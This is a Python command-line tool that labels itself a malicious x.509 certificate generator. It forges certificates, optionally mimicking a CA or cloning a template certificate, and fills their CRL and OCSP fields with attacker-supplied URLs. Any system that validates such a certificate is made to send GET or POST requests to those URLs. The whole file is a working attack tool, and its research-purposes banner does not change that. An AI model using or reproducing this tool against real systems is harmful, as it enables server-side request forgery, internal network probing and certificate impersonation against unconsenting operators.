#!/usr/bin/env python3

import argparse

from OpenSSL import crypto


def header():
    print('''\
######################################################################
# Malicious x.509 certificate generator. Only for research purposes! #
######################################################################
''')


def create_payload(cert: crypto.X509, filename: str, pkcs12: bool, ca_cert: crypto.X509=None):
    if ca_cert:
        ca_key = crypto.PKey()
        ca_key.generate_key(crypto.TYPE_RSA, 1024)
        ca_cert.set_pubkey(ca_key)
        ca_cert.sign(ca_key, 'sha1')
    key = crypto.PKey()
    key.generate_key(crypto.TYPE_RSA, 1024)
    cert.set_pubkey(key)
    cert.sign(key if not ca_cert else ca_key, 'sha1')
    if not pkcs12:
        with open(filename + '.crt', 'wb') as f:
            print('Writing certificate...')
            f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
        with open(filename + '.key', 'wb') as f:
            print('Writing key... Password is ""')
            f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, key))
        if ca_cert:
            print('Writing ca_certififcate...')
            with open(filename + '_ca.crt', 'wb') as f:
                f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, ca_cert))
    else:
        store = crypto.PKCS12()
        if ca_cert:
            store.set_ca_certificates([ca_cert])
        store.set_certificate(cert)
        store.set_privatekey(key)
        with open(filename + '.pfx', 'wb') as f:
            print('Writing PKCS12... No export password')
            f.write(store.export())


def gen_cert(serial: int, subj_dn: str, issuer_dn: str, crls: list=None, ocsps: list=None, template: str=None):
    if template:
        with open(template, 'rb') as f:
            cert = crypto.load_certificate(crypto.FILETYPE_PEM, f.read())
            print('Successfully loaded cert {}'.format(cert.get_subject()))
    else:
        cert = crypto.X509()
        subj = cert.get_subject()
        issuer = cert.get_issuer()
        set_dn(subj_dn, subj)
        set_dn(issuer_dn, issuer)
        cert.set_serial_number(serial)
        cert.gmtime_adj_notBefore(0)
        cert.gmtime_adj_notAfter(10 * 365 * 24 * 60 * 60)
    if crls:
        crls_str = ','.join(['URI: {}'.format(url) for url in crls])
        crl_ext = crypto.X509Extension(critical=True, type_name=b"crlDistributionPoints",
                                       value=crls_str.encode())
        cert.add_extensions([crl_ext])
    if ocsps:
        ocsps_str = ','.join(['OCSP;URI: {}'.format(url) for url in ocsps])
        ocsp_ext = crypto.X509Extension(critical=True, type_name=b"authorityInfoAccess",
                                       value=ocsps_str.encode())
        cert.add_extensions([ocsp_ext])
    return cert


def set_dn(name: str, dn: crypto.X509Name) -> crypto.X509Name:
    try:
        args = [arg.split('=') for arg in name.split('/')[1:]]
        kwargs = {k: v for k, v in args}
        if 'C' in kwargs: dn.C = kwargs['C']
        if 'ST' in kwargs: dn.ST = kwargs['ST']
        if 'L' in kwargs: dn.L = kwargs['L']
        if 'O' in kwargs: dn.O = kwargs['O']
        if 'OU' in kwargs: dn.OU = kwargs['OU']
        if 'CN' in kwargs: dn.CN = kwargs['CN']
    except Exception as e:
        print('Exception while parsing distinguished name {}'.format(name))
        raise e


if __name__=="__main__":
    parser = argparse.ArgumentParser(description="Generate custom url-imbued x.509 certificates")
    parser.add_argument("-u", "--urls", nargs="+", required=True,
                        help="url for CRL field (GET request)")
    parser.add_argument("--post-urls", nargs="+",
                        help="url for OSCP field (POST request) [default to --url]")
    parser.add_argument("-o", "--out", default="evil",
                        help="certificate, key or pfx name (without extension)")
    parser.add_argument("--pkcs12", action='store_true',
                        help="don't save key and cert. Use PKCS#12 instead")
    parser.add_argument("--serial", default=1000, type=int,
                        help="set serial number")
    parser.add_argument("--subject", default="/C=US/ST=Lorem/L=IPSUM/O=Inc./emailAddress=admin@example.org/CN=Example",
                        help="distinguished name to use for subject (default: %(default)s)")
    parser.add_argument("--issuer", default="/C=US/ST=Lorem/L=IPSUM/O=Inc./emailAddress=admin@example.org/CN=Example",
                        help="distinguished name to use for issuer (default: %(default)s)")
    parser.add_argument("-c", "--cert", help="a valid certificate used as template")
    parser.add_argument("--mimic-ca", action='store_true',
                        help="generate a ca with $issuer and $serial as parameters instead of self-signing")
    args = parser.parse_args()
    args.post_urls = args.post_urls or args.urls

    header()
    cert = gen_cert(args.serial, args.subject, args.issuer,
                    args.urls, args.post_urls, args.cert)
    ca_cert = None
    if args.mimic_ca:
        ca_cert = gen_cert(args.serial, args.issuer, args.issuer)
    create_payload(cert, args.out, args.pkcs12, ca_cert)
